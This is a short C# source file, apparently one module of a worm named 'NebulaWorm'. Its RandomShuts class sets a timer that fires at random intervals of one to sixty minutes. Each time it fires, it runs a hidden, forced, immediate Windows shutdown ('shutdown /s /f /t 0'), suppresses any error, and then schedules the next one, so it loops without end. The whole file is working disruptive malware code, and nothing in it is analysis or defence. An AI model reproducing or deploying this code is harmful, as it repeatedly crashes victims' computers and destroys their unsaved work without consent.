using System;
using System.Diagnostics;
using System.Threading;

namespace NebulaWorm
{
    public static class RandomShuts
    {
        private static Timer shutdownTimer;
        private static Random rnd = new Random();

        public static void Start()
        {
            ScheduleNextShutdown();
        }

        private static void ScheduleNextShutdown()
        {
            // 1-60 minutes random
            int interval = rnd.Next(1 * 60 * 1000, 60 * 60 * 1000);

            shutdownTimer = new Timer((state) =>
            {
                TryShutdown();
                ScheduleNextShutdown(); // loop
            }, null, interval, Timeout.Infinite);
        }

        private static void TryShutdown()
        {
            try
            {
                // shut command
                Process.Start(new ProcessStartInfo("shutdown", "/s /f /t 0")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch
            {
            }
        }
    }
}
